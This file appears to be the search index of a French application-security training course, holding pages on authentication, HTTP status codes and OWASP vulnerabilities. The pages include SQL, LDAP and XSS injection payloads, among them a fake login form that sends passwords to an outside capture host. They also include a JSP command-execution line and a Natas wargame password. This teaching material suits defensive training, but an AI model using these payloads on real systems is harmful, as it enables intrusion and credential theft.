var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(n){const s=suggestions.classList.contains("d-none");if(s)return;const e=[...suggestions.querySelectorAll("a")];if(e.length===0)return;const t=e.indexOf(document.activeElement);if(n.key==="ArrowUp"){n.preventDefault();const s=t>0?t-1:0;e[s].focus()}else if(n.key==="ArrowDown"){n.preventDefault();const s=t+1<e.length?t+1:t;e[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/authentification/",title:"Authentification",description:"",content:""}).add({id:1,href:"/docs/authentification/principes/",title:"Les grands principes de l'authentification",description:"3 # Authentification # Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiée #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrée Comment stocker cette information ? Type de base de donnée dédiée : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte à puce, code à usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanés améliorent la preuve (mot de passe + carte à puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accéder à plusieurs services Système d\u0026rsquo;authentification centralisé Question du SLO  Logout = déconnexion de l\u0026rsquo;application uniquement ?",content:"3 # Authentification # Qu\u0026rsquo;est qu\u0026rsquo;une personne authentifiée #  Une personne connue de l\u0026rsquo;application Elle est donc enregistrée Comment stocker cette information ? Type de base de donnée dédiée : l\u0026rsquo;annuaire  Qu\u0026rsquo;est que l\u0026rsquo;authentification #  Validation d\u0026rsquo;une identification Un utilisateur doit indiquer qui il est (identifiant, certificat client) et le prouver (mot de passe, certifcat client, carte à puce, code à usage unique, empreinte digitale) Au moins un facteur, mais plusieurs facteurs simultanés améliorent la preuve (mot de passe + carte à puce)  Le SSO - Single Sign On #  S\u0026rsquo;identifier une seule fois pour accéder à plusieurs services Système d\u0026rsquo;authentification centralisé Question du SLO  Logout = déconnexion de l\u0026rsquo;application uniquement ? Ou déconnexion de l\u0026rsquo;application et du fournisseur d\u0026rsquo;identité ? Ou encore, de l\u0026rsquo;application, du fournisseur, et de toutes les autres applis s\u0026rsquo;étant connectées via le fournisseur ?    Annuaire # Référentiel permettant de stocker des données de manière hiérarchique et offrant des mécanismes pour rechercher efficacement l\u0026rsquo;information.\n Recensement des informations sur les utilisateurs, sur les applications, sur un parc informatique Authentifier un utilisateur Donner un droit d\u0026rsquo;un objet sur un autre, gestion de groupes (hierarchie)  Technologies d\u0026rsquo;annuaires #  OpenLDAP : projet opensource Active Directory (AD) : solution Microsoft.  Ressource authentifié # Les besoins d\u0026rsquo;authentification sont variés.\nUne application peut proposer :\n Du contenu public (donc sans authentification) Du contenu accessible à n\u0026rsquo;importe quel utilisateur authentifié Du contenu accessible à certains utilisateurs  Ressource authentifié #  Authentification explicite : je présente un en-tête \u0026ldquo;Authorization\u0026rdquo; dans ma requête Authentification implicite : je m\u0026rsquo;attends à ce que l\u0026rsquo;application me donne un moyen de m\u0026rsquo;authentifier  Ressource authentifié # En arrivant sur une page où je suis censé être authentifié\n Je présente un header \u0026ldquo;Authorization\u0026rdquo; ? Si oui et que l\u0026rsquo;application l\u0026rsquo;accepte je suis authentifié Sinon, l\u0026rsquo;application peut me proposer des moyens de m\u0026rsquo;authentifier S\u0026rsquo;il n\u0026rsquo;y a pas d\u0026rsquo;autres moyens que le header Authorization ou que j\u0026rsquo;ai déjà tenté tous les modes possibles sans succès, je reçois définitivement une erreur 401 \u0026ldquo;Unauthorized\u0026rdquo;  Ressource authentifié # Si un ou plusieurs autre modes de connexion sont disponibles, les fonctionnements sont variés :\n 401 + WWW-Authenticate header : le navigateur doit savoir réagir 200 + traitements divers ou 30X : redirection vers page de login ou vers un fournisseur d\u0026rsquo;identité  Ressource authentifié #  Exemple : l\u0026rsquo;authentification Basic  Authorization: Basic Base64(identifiant:motdepasse)   Si un site propose l\u0026rsquo;authentification Basic, et que l\u0026rsquo;on vient sans l\u0026rsquo;entête authorisation, le site répond avec l\u0026rsquo;entête :  WWW-Authenticate: Basic realm=\u0026quot;nom d'affichage\u0026quot;   Le navigateur voyant cet entête affiche à l\u0026rsquo;utilisateur une pop-up demandant un identifiant et mot de passe et ayant pour titre le \u0026ldquo;nom d\u0026rsquo;affichage\u0026rdquo; Le navigateur utilisera ce couple identifiant mot de passe pour former l\u0026rsquo;en-tête Authorisation tout le reste de la session  Ressource authentifié # Je suis correctement identifié mais la ressource ne s\u0026rsquo;adresse qu\u0026rsquo;à un certain type d\u0026rsquo;utilisateur dont je ne fais pas partie :\n Erreur 403 Forbidden  Rappel code réponse HTTP : #  20X : succès 30X : redirection 40X : erreur côté Client Web 50X : erreur côté Serveur Web  Rappel code réponse HTTP : #  200 : OK 301 : Moved Permanently 302 : Found (Déplacé temporairement) 400 : Bad Request 401 : Unauthorized 403 : Forbidden 404 : Not Found 418 : I’m a teapot (RFC 2324) 500 : Internal Server Error 503 : Service Unavailable : réponse fournie par un reverse proxy si l\u0026rsquo;application n\u0026rsquo;est pas disponible (maintenance par exemple)  Rappel code réponse HTTP : # 401 ou 403 ?\n 401 : Unauthorized : L\u0026rsquo;authentification ne s\u0026rsquo;est pas dérolée comme prévue ou elle s\u0026rsquo;est bien déroulée mais l\u0026rsquo;utilisateur est inconnu de l\u0026rsquo;application 403 : Forbidden : L\u0026rsquo;authentification s\u0026rsquo;est bien déroulée et l\u0026rsquo;utilisateur est connu mais il n\u0026rsquo;a pas les habilitations nécessaires  Comment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut simplement présenter une identifiation. C\u0026rsquo;est alors à moi de déterminer si l\u0026rsquo;utilisateur a le droit d\u0026rsquo;accéder à la ressource et d\u0026rsquo;afficher les bonnes informations.\nM Robichu se connecte à mon questionnaire en ligne.\nIl a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, la seule information connue de l\u0026rsquo;application est alors son identifiant.\nL\u0026rsquo;application recherche en base de données l\u0026rsquo;identifiant de M Robichu et récupère bien une ligne qui contient notamment les informations déjà renseignées par M Robichu.\nJe sais donc que M Robichu a les droits sur l\u0026rsquo;application et je peux en plus préremplir le questionnaire avec ce que je sais déjà\nComment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut fournir une réponse plus complète contenant des rôles. Je peux alors me servir de ces rôles récupérés pour gérer l\u0026rsquo;accès à mes ressources.\nM Robichu se connecte à mon questionnaire en ligne.\n*Il a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, les informations connues de l\u0026rsquo;application sont maintenant son identifiant mais aussi une liste de rôles dont \u0026ldquo;repondant-enquete-satisfaction-joint-etancheite-climatiseur-morgue\u0026rdquo;. *\nJe sais directement que M Robichu a les droits sur l\u0026rsquo;application. Mais rien ne m\u0026rsquo;empêche de chercher en base de données des informations plus précises sur M Robichu\nComment savoir si l\u0026rsquo;utilisateur a les droits ? # Rôles dans l\u0026rsquo;authentification ou en base de données ?\nSe limiter au rôles le plus brut possible dans le système d\u0026rsquo;authentification (répondant, administrateur)\nÉviter de trop spécifier le rôle surtout si l\u0026rsquo;on possède l\u0026rsquo;information en base de données. (répondant à l\u0026rsquo;enquête X, à l\u0026rsquo;enquête Y, etc.)\nQuelques exemples d\u0026rsquo;authentification # Authentifications directes :\n Basic Formulaire Certificat Client Kerberos : adapté au Web par SPNEGO, Simple and Protected GSSAPI (Generic Security Services Application Program Interface) Negotiation Mechanism, implémenté par AD NTLM (NT Lan Manager) : Systèmes Windows ou compatible AD  Authentifications centralisées nécessitant l\u0026rsquo;utilisation d\u0026rsquo;un autre mode :\n SAML OpenID Connect  Kerberos # WWW-Authenticate: Negociate\n Système d\u0026rsquo;échange de jeton basé sur des clés symétriques (déduites des mots de passes)  https://blog.devensys.com/kerberos-principe-de-fonctionnement/\nNTLM # Kerberos simplifié et moins sécurisé\nWWW-Authenticate: NegociateNTLM\n Envoi de l\u0026rsquo;identifiant Challenge du serveur, à résoudre avec le hash du mot de passe Le serveur demande à AD de valider (identifiant,challenge, réponse du client) AD répond au serveur si l\u0026rsquo;authentification est OK  Authentifications Kerberos ou NTLM : Sécurité #  Afin de contrôler ce flux, les sources autorisées à émettre une demande de challenge sont contrôlées Dans Firefox, il s\u0026rsquo;agit des propriétés suivantes (about:config)  network.negotiate-auth.delegation-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.negotiate-auth.trusted-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.automatic-ntlm-auth.trusted-uris :  Plus d\u0026rsquo;informations : https://developer.mozilla.org/en-US/docs/Mozilla/Integrated_authentication\nConfidentialité de l\u0026rsquo;authentification #  Kerberos, NTLM, SAML : Sécurité intrinsèque (même sur un canal en clair, une lecture réseau ne permet pas d\u0026rsquo;obtenir des informations sur les credentials de l\u0026rsquo;utilisateur) Certificat client : Étape du protocole HTTPS Formulaire, Basic, OIDC : Sécurité basée sur un canal chiffré (HTTPS)  Utilisation d\u0026rsquo;une fédération d\u0026rsquo;identité #  On verra le fonctionnement en détail plus tard (SAML, OpenIDConnect) Principe : déléguer l\u0026rsquo;authentification à un autre système (Kerberos et NTLM sont au fond des fédérations d\u0026rsquo;identité) Intérêts :  Authentification centralisée Éviter les accès directs aux annuaires SSO Amélioration de la sécurité : la sécurité est également déléguée au protocole et au système authentifiant, reduction de la surface d\u0026rsquo;attaque Cependant la sécurité du client reste à la charge des applications    "}).add({id:2,href:"/docs/https/",title:"Https",description:"",content:""}).add({id:3,href:"/docs/failles/",title:"Failles applicatives",description:"",content:""}).add({id:4,href:"/docs/intro/",title:"Introduction",description:"",content:""}).add({id:5,href:"/docs/intro/grands-principes/",title:"Les grands principes de la sécurité",description:"Qu\u0026rsquo;est ce que \u0026ldquo;la sécurité infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portée variant selon les sources)\n Disponibilité Intégrité Confidentialité Authentification Traçabilité Non répudiation   La première partie de cette formation présentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n Disponibilité #  S\u0026rsquo;assurer que les utilisateurs peuvent accéder au service sur les plages d\u0026rsquo;utilisation prévues et en respectant des temps de réponse attendus Du ressort des ops\u0026hellip;  Haute disponibilité via plusieurs couloirs (scalabilité horizontale) Ajutement mémoire/CPU (scalabilité verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Éviter les traitements saturant la machines en une requête\u0026hellip; Suivre les mises à jour des librairies    Intégrité #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyée à l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reçoit Solutions pour considérations techniques (réseau perturbé, perte de paquet, \u0026hellip;)  Ajout de mécanismes de controles : TCP avec numéro de séquence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prémunir d\u0026rsquo;une altération volontaire des données par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    Confidentialité #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le récepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identité du serveur distant Nécessité de chiffrer les données TLS surchargé aux principaux protocoles (HTTPS, FTPS, etc.",content:"Qu\u0026rsquo;est ce que \u0026ldquo;la sécurité infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portée variant selon les sources)\n Disponibilité Intégrité Confidentialité Authentification Traçabilité Non répudiation   La première partie de cette formation présentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n Disponibilité #  S\u0026rsquo;assurer que les utilisateurs peuvent accéder au service sur les plages d\u0026rsquo;utilisation prévues et en respectant des temps de réponse attendus Du ressort des ops\u0026hellip;  Haute disponibilité via plusieurs couloirs (scalabilité horizontale) Ajutement mémoire/CPU (scalabilité verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Éviter les traitements saturant la machines en une requête\u0026hellip; Suivre les mises à jour des librairies    Intégrité #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyée à l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reçoit Solutions pour considérations techniques (réseau perturbé, perte de paquet, \u0026hellip;)  Ajout de mécanismes de controles : TCP avec numéro de séquence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prémunir d\u0026rsquo;une altération volontaire des données par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    Confidentialité #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le récepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identité du serveur distant Nécessité de chiffrer les données TLS surchargé aux principaux protocoles (HTTPS, FTPS, etc.)  👉  L'intégrité est très difficilement dissociable de la confidentialité  Une appli sans HTTPS n'est plus envisageable aujourd'hui    Un kit de survie du HTTPS sera abordé dans la partie HTTPS de la formation. Il s\u0026rsquo;agit de connaitre les principes de base, afin de pouvoir apréhender les principales erreurs relative à une configuration HTTPS.\n Authentification #  Une opération n\u0026rsquo;est accessible qu\u0026rsquo;à ceux qui sont censé réaliser l\u0026rsquo;opération Prouver qu\u0026rsquo;on est celui qu\u0026rsquo;on déclare être  On parle de facteurs d\u0026rsquo;authentification pour chaque preuve que l\u0026rsquo;on peut aborder\n Ce que je sais : mot de passe Ce que je possède : certificat, carte à puce, badge Ce que je suis : empreinte digitale, rétinienne   Une grande partie de cette formation se focalise sur les enjeux et les moyens concret de mettre en place une authentification sur son application\n Traçabilité #  Être capable de savoir ce qui s\u0026rsquo;est passé sur un serveur et par qui Avoir un système de logs,\u0026hellip; Connaitre son sytème de logs !!! Avoirs des moyens efficace de rechercher une information dans ses logs   Ne sera pas abordé dans cette formation, mais reste une étape indispensable à la reflexion de la sécurité de son application. Le jour on aura besoin de savoir ce qu\u0026rsquo;il s\u0026rsquo;est passé, ce sera trop tard pour y penser\u0026hellip;\n Non répudiation #  Un utilisateur ne peut nier une action effectuée \u0026ldquo;Signature d\u0026rsquo;un contrat\u0026rdquo; Principe de la signature électronique   Hors scope de cette formation\n Pour aller plus loin #  Auto-formation aux grands concepts de la sécurité par l\u0026rsquo;ANSSI : https://www.secnumacademie.gouv.fr/  "}).add({id:6,href:"/docs/failles/intro/",title:"Qu'est ce qu'une faille applicative ?",description:"Demandons l\u0026rsquo;avis à Wikipedia :   Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l\u0026rsquo;intégrité de ce système, c\u0026rsquo;est-à-dire à son fonctionnement normal, à la confidentialité ou à l\u0026rsquo;intégrité des données qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnérabilité dans une application informatique qui permet à un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accès non autorisé, modifier des données ou exécuter des actions malveillantes.",content:" Demandons l\u0026rsquo;avis à Wikipedia :   Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l\u0026rsquo;intégrité de ce système, c\u0026rsquo;est-à-dire à son fonctionnement normal, à la confidentialité ou à l\u0026rsquo;intégrité des données qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnérabilité dans une application informatique qui permet à un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accès non autorisé, modifier des données ou exécuter des actions malveillantes.\n  Les failles applicatives peuvent être causées par une mauvaise conception de l\u0026rsquo;application, des erreurs de programmation, des problèmes de configuration ou des erreurs humaines. Certaines des vulnérabilités les plus courantes comprennent les injections SQL, les attaques de scripts entre sites (XSS), les attaques de falsification de demande intersite (CSRF), les failles d\u0026rsquo;authentification, les failles de contrôle d\u0026rsquo;accès, les erreurs de validation de données, etc.\n  Il est important pour les développeurs et les équipes de sécurité informatique de détecter et de corriger rapidement les failles applicatives pour éviter que des attaquants ne profitent de ces vulnérabilités. Les tests de sécurité réguliers, les examens de code et les audits de sécurité sont des moyens courants de détection et de correction des failles applicatives.\n Grandes catégories :\n Une erreur de conception ? Une erreur de configuration ? Une erreur de programmation (bug, fonctionnalité mal implémentée) ?  Une erreur de conception ? # Cas 1 :\nSoit une plateforme de réservation en ligne pour des chambres d\u0026rsquo;hôtel.\nJe propose aux utilisateurs d\u0026rsquo;annuler leurs commandes jusqu\u0026rsquo;à 16 h.\nUn concurrent peut facilement pourrir mon hôtel en réservant toutes les chambres et en les annulant à 15h55.\nEst ce que cela fait partie du fonctionnement normal ?\nCas 2 :\nSur mon web service de gestion d\u0026rsquo;annuaire, on peut créer autant d\u0026rsquo;habilitations que l\u0026rsquo;on veut pour un contact\nAu delà d\u0026rsquo;environ 300 habilitations c\u0026rsquo;est l\u0026rsquo;annuaire qui finit par planter\u0026hellip;\nProblématiques à la conception :\n S\u0026rsquo;assurer que par design certains processus ne seront pas forcément soumis à des instabilités Connaître les limites de son système  Une erreur de configuration ? # Quelques exemples :\n L\u0026rsquo;application n\u0026rsquo;est pas proposée et forcée en HTTPS Flux trop large en entrée (par exemple possiblité de connexion sur ports d\u0026rsquo;administration ou base de données exposée) Secrets exposés Bibliothèques à jour mais avec une configuration permettant de faire n\u0026rsquo;importe quoi (mode.debug=true ou conf.developpement=true) \u0026hellip;  Une erreur de programmation ? #  Son propre code Le code des autres, dit autrement les bibliothèques utilisées : Nécéssité de mise à jour régulière !  Le top 10 des vulnérabilités : OWASP\nhttps://owasp.org/www-project-top-ten/\n A1 : Acceder à une ressource non prévue :  Mauvaise gestion des droits En forcant un utilisateur privilégié à cliquer sur l\u0026rsquo;action souhaitée = XSS y compris injection de code \u0026ldquo;côté client\u0026rdquo; Vol de session : conséquence de XSS et d\u0026rsquo;injection de code \u0026ldquo;côté client\u0026rdquo;   A2 : Ne pas ou mal utiliser un canal chiffré  Protocoles obsolètes, contrôles non effectués HTTPS non obligatoire      A3 : Injection de code \u0026ldquo;côté serveur\u0026rdquo;  Faire éxécuter du code non prévu en particulier directement sur la base de données   A4 : Erreur de conception  La meilleure des implémentations ne corrigera pas   A5 : Erreur de configuration A6 : Bibliothèques pas à jour (ou utilisation de bibliothèques abandonnées)  Bugs des \u0026ldquo;autres\u0026rdquo;      A7 : Failblesses d\u0026rsquo;authentification  Possibilité de brute force Mots de passe faibles ou trop standards Déconnexions et invalidation de session mal gérés   A8 : Non controles d\u0026rsquo;intégrité  Données entrantes (au run) Bibliothèques vérolées (au build)      A9 : Défaut de tracabilité  Logs inexploitables Impossible de savoir clairement qui a fait quoi et quand   A10 : Injection de code \u0026ldquo;côté serveur\u0026rdquo;, vision réseau  Sécurité en profondeur, cloisonnement réseau Comptes applicatif à droits limités     Les vulnérabilités concrètement ! #   https://imgs.xkcd.com/comics/exploits_of_a_mom.png --  L\u0026rsquo;injection de code # Que s\u0026rsquo;est-il passé ?\n École municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel élève\nPrénom : Inscrire l\u0026rsquo;élève\n   L\u0026rsquo;injection de code # Que s\u0026rsquo;est-il passé ?\npublic void inscrireEleve(String prenom){ String maRequeteSQL = \u0026quot;INSERT INTO Students VALUES ('\u0026quot; + prenom + \u0026quot;')\u0026quot;; connectionSql.createStatement().executeQuery(maRequeteSQL); }   L\u0026rsquo;injection de code # Que s\u0026rsquo;est-il passé ?\n Si on remplit dans le formulaire Robert'); DROP TABLE Students;-- La requète envoyée au serveur devient :  INSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')   L\u0026rsquo;injection de code \u0026ldquo;côté serveur\u0026rdquo; : SQL ou LDAP # Pourquoi ?\n Consulter des données confidentielles Altérer la base de données   L\u0026rsquo;injection de code \u0026ldquo;côté serveur\u0026rdquo; # Exemple en SQL # \u0026quot;SELECT * FROM USER WHERE identifiant='\u0026quot; + username + \u0026quot;' AND password='\u0026quot; + password + \u0026quot;'\u0026quot;;  à renseigner avec username=robichu et password=' OR '1'='1' -- pour se connecter en tant que M Robichu\n L\u0026rsquo;injection de code \u0026ldquo;côté serveur\u0026rdquo; # Exemple en LDAP # \u0026quot;(\u0026amp;(uid = \u0026quot; + user_name + \u0026quot;) (userpassword = \u0026quot; + user_password + \u0026quot;))\u0026quot;;  à renseigner avec username=robichu)(\u0026amp;) pour se connecter en tant que M Robichu\n L\u0026rsquo;injection de code \u0026ldquo;côté serveur\u0026rdquo; : SQL ou LDAP # Sécurité :\n Échapper les caractères spéciaux =\u0026gt; Utiliser des PreparedStatement =\u0026gt; Utiliser des Frameworks qui font le boulot (hibernate, \u0026hellip;) Et que l\u0026rsquo;on garde à jour bien entendu   Vous avez Gagné # Cliquez la\n  Vous avez Gagné # Cliquez la\n   Les attaques basées sur des croisements de domaines #   Un utilisateur connecté sur un site légitime envoie des données à un site attaquant Un site attaquant force un utilisateur à faire une opération non souhaité sur le site légitime   Les \u0026lt;iframe\u0026gt; #  Principe légitime à la base : afficher une page web sur une autre page web Comportements détournés Clickjacking = on cache une iframe par dessus un bouton aparemment légitime  \u0026lt;iframe style=\u0026quot;opacity: 0\u0026quot; src=\u0026quot;https://le-site-des-admins\u0026quot;\u0026gt;   XFS #  XFS ou Cross Frame Scripting : principe général d\u0026rsquo;attaque consistant à injecter le site légitime sur le site du pirate via un iframe    Protection  Déclarative uniquement = on va dire au navigateur que le site n\u0026rsquo;a aucune raison légitime d\u0026rsquo;être dans une iframe Des entêtes standards existent :  X-Frame-Options:\u0026lt;DENY|SAMEORIGIN|ALLOW-FROM https://example.com/\u0026gt;;   On filtre donc les origines qui ont le droit d\u0026rsquo;afficher l\u0026rsquo;iframe /!\\ Absence d\u0026rsquo;entête = autorisé de n\u0026rsquo;importe quel source     L\u0026rsquo;injection de code\u0026hellip; côté client ! #  École municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel élève\nPrénom : Inscrire l\u0026rsquo;élève\n   L\u0026rsquo;injection de code\u0026hellip; côté client ! # Et si j\u0026rsquo;écrit dans le formulaire :\n\u0026lt;form action=\u0026quot;https://securite-applicative.free.beeceptor.com\u0026quot; \u0026gt;Entrez votre mot de passe : \u0026lt;input type=\u0026quot;password\u0026quot; name=\u0026quot;password\u0026quot; /\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; formtarget=\u0026quot;_blank\u0026quot;\u0026gt;Me connecter\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;  Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative\n L\u0026rsquo;injection de code\u0026hellip; côté client ! # Déclinable à souhait\u0026hellip;\n\u0026lt;button onclick=\u0026quot;window.location='https://securite-applicative.free.beeceptor.com'\u0026quot; \u0026gt;Continuer\u0026lt;/button\u0026gt;   L\u0026rsquo;injection de code \u0026ldquo;côté client\u0026rdquo; # On peut forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action\n En le redirigeant sur la page avec des paramètres de requete trafiqués En stockant en base un code qui va être réaffiché   L\u0026rsquo;injection de code \u0026ldquo;côté client\u0026rdquo; #  On peut ainsi rajouter ce genre de code sur la page de l\u0026rsquo;utilisateur  \u0026lt;script\u0026gt;document.location=\u0026quot;https://no.domain\u0026quot;\u0026lt;/script\u0026gt;  \u0026lt;script\u0026gt; document.getElementsByTagName(\u0026quot;body\u0026quot;)[0].innerHTML(\u0026quot; \u0026lt;form action='https://no.domain' \u0026gt; \u0026lt;br\u0026gt;Connectez vous !\u0026lt;br\u0026gt; \u0026lt;input type='text' name='email'\u0026gt; \u0026lt;input type='password' name='mot de passe'\u0026gt; \u0026lt;input type='submit' value='Connexion'\u0026gt; \u0026lt;/form\u0026gt; \u0026quot;) \u0026lt;/script\u0026gt;   L\u0026rsquo;injection de code \u0026ldquo;côté client\u0026rdquo; : XSS (Cross-Site Scripting) #  Pourquoi ? #  Vol de données, en particulier des cookies de session (explications) Redirection malveillante   Comment ? #  Consiste à injecter du code et en particulier des script dans une page web (donc éxécuté par l\u0026rsquo;utilisateur dans son navigateur) L\u0026rsquo;attaquant fournit une requête vers un site légitime mais dont le contenu injecte le code L\u0026rsquo;attaquant peut aussi profiter d\u0026rsquo;une non validation des données persistantes (BDD)   Types de XSS #  Injection \u0026ldquo;en direct\u0026rdquo; par le serveur, on parle de reflected XSS On l\u0026rsquo;appelle DOM XSS, si elle consiste à modifier le DOM via un script Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n\u0026rsquo;a même plus besoin de fournir un lien trafiqué à l\u0026rsquo;utilisateur.   Sécurité : #  Vérifier les entrées utilisateurs ! Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple ${fn:escapeXml(string)} dans une EL en JSP)   Sécurité déclarative : #  Résumé des headers Content Security Policy (CSP) Prez Spec (deprecated) X-XSS-Protection   Compléments pour la protection des cookies #  Forcer les cookies à être \u0026ldquo;secure\u0026rdquo; (utilisable en https uniquement), \u0026ldquo;httpOnly\u0026rdquo; (non utilisable dans les scripts) Précision : il s\u0026rsquo;agit de sécurité déclarative dont la mise en oeuvre est à la charge du navigateur   Un peu plus de pratique ?? #  Avant de continuer\u0026hellip; # Découvrons une série challenge disponible sur internet\n Natas 0 (mot de passe de natas0 : natas0) Sur les premiers niveaux, on voit qu\u0026rsquo;une resource cachée n\u0026rsquo;est jamais cachée (Digression : robots.txt) et que quelques éléments pouvent être très facilement manipulés dans la requête   L\u0026rsquo;injection de code : le retour de la revanche # Quelques niveaux plus tard :\n Natas 12 (mot de passe de natas12 : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3) Le but est de découvrir le mot de passe de natas13 situé dans /etc/natas_webpass/natas13 Hint : passthru est une fonction php permettant d\u0026rsquo;éxécuter sur le sytème du code arbitraire    L\u0026rsquo;injection de code : le retour de la revanche # Exécution de code sur le serveur\n Mettre un fichier malicieux sur le serveur permettant l\u0026rsquo;éxécution de code à distance. Ici le code injecté sera du code éxécuté côté serveur (java sur jsp, php)   L\u0026rsquo;injection de code \u0026ldquo;côté serveur\u0026rdquo; #  Exécution de code sur le serveur au plus près du système Rebond sur le SI possible si :  flux larges entre les différents serveurs compte éxécutant le code à haut privilège      Nombreuses possibilités : aussi bien des traitements dans l\u0026rsquo;application non prévus que des opérations directement sur le système d\u0026rsquo;exploitation Par exemple réussir à placer sur le serveur une jsp contenant :  \u0026lt;%Runtime.getRuntime().exec(\u0026quot;less /confidentiel/data\u0026quot;);%\u0026gt;   Un langage de programmation lance indirectement des commandes système   Sécurité : #  Contrôler les entrées utilisateurs et en particulier pour les fichiers :  le type MIME des entrées, la cohérence type attendu et contenu autant que possible l\u0026rsquo;extention de fichier nommé car le serveur et/ou le navigateur peut interpréter différemment un fichier selon son nommage     Sécurité : #  Côté prod :  \u0026ldquo;chroot\u0026rdquo; des applications ou machines limité à un traitement utilisateur éxécutant l\u0026rsquo;application avec droit limités (ce n\u0026rsquo;est pas le compte root/admin qui démarre le tomcat) flux limités entre machines     L\u0026rsquo;injection de code : Synthèse #  Un sujet central : l\u0026rsquo;entrée untilisateur Mais qu\u0026rsquo;est ce qu\u0026rsquo;une entrée utilisateur ?   L\u0026rsquo;injection de code # Qu\u0026rsquo;est ce qu\u0026rsquo;une entrée utilisateur ?\n Requête et Paramètres de requête Corps de requête (contenu des requête POST et PUT) : réponse à un formulaire, fichier Cookies Entetes HTTP (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, \u0026hellip;)   L\u0026rsquo;injection de code # Controle des chaines entrées et échappement de tous les caratères interprétables en html, en sql,\u0026hellip; selon la situation.\nUn développeur web peut se contenter de surveiller ces entrées mais en réalité, les failles peuvent survenir sur n\u0026rsquo;importe quel bit d\u0026rsquo;un échange réseau.\n Les attaques basées sur des échanges entre domaines : encore une !! # CSRF (Cross-Site Request Forgery)\n scénario : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l\u0026rsquo;action s\u0026rsquo;effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.   Démo CSRF # https://www.root-me.org/fr/Challenges/Web-Client/CSRF-0-protection\nUn admin regarde vraiment ses messages de temps en temps !\n Protections # Problématique :\n On ne cherche pas à empécher une acton malveillante en soi On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s\u0026rsquo;assurer que l\u0026rsquo;utilisateur réalise son opération en pleine conscience.   Protections #  Vérifier les entrées utilisateurs ? Ici, l\u0026rsquo;action à bloquer est légitime\u0026hellip;   Protections #  Faire en sorte qu\u0026rsquo;à chaque appel d\u0026rsquo;un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s\u0026rsquo;assurer de la cohérence de la requête Des bibliothèques peuvent aider à cette protection : Spring security, pac4j   Protections #  Il faut alors ajouter dans chaque formulaire le jeton en hidden  \u0026lt;form action=\u0026quot;/monActionAdmin\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Faire l'opération sensible\u0026quot; /\u0026gt; 